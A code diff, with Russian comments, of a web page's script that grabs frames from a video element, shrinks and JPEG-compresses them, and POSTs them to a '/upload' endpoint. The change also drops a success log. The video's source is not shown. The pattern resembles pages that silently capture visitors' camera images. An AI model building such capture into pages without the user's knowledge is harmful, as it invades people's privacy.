@@ -84,28 +84,29 @@
         });
         // Функция для захвата кадра и отправки на сервер
         async function captureAndUpload(videoElement) {
+            // Проверяем, что видео готово и имеет размеры
+            if (videoElement.paused || videoElement.ended || videoElement.videoWidth === 0) return;
+
             const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
+            // Уменьшаем разрешение для стабильной передачи (например, до 400px по ширине)
+            const scale = 400 / videoElement.videoWidth;
+            canvas.width = 400;
+            canvas.height = videoElement.videoHeight * scale;
+            
             const ctx = canvas.getContext('2d');
             ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            // Превращаем в base64
-            const imageData = canvas.toDataURL('image/png');
+            // Сжимаем изображение (quality: 0.5), чтобы строка не была слишком длинной
+            const imageData = canvas.toDataURL('image/jpeg', 0.5);
 
             try {
-                const response = await fetch('/upload', {
+                await fetch('/upload', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ image: imageData })
                 });
-
-                if (response.ok) {
-                    console.log("[!] Кадр успешно отправлен на сервер");
-                }
             } catch (err) {
                 console.error("Ошибка отправки:", err);
             }
-        }
-    </script></body>
+        }    </script></body>
 </html>
